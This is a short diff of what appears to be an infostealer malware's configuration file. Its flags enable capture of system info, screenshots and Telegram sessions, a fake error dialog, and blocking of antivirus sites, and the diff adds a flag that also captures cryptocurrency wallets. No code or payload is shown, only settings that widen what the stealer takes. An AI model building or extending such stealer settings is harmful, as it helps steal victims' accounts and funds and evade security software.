@@ -19,6 +19,7 @@
         "captureSystemInfo" : true,
         "captureScreenshot" : true,
         "captureTelegramSession" : true,
+        "captureWallets" : true,
 
         "fakeError" : [false, ["title", "message", 0]],
         "blockAvSites" : true,
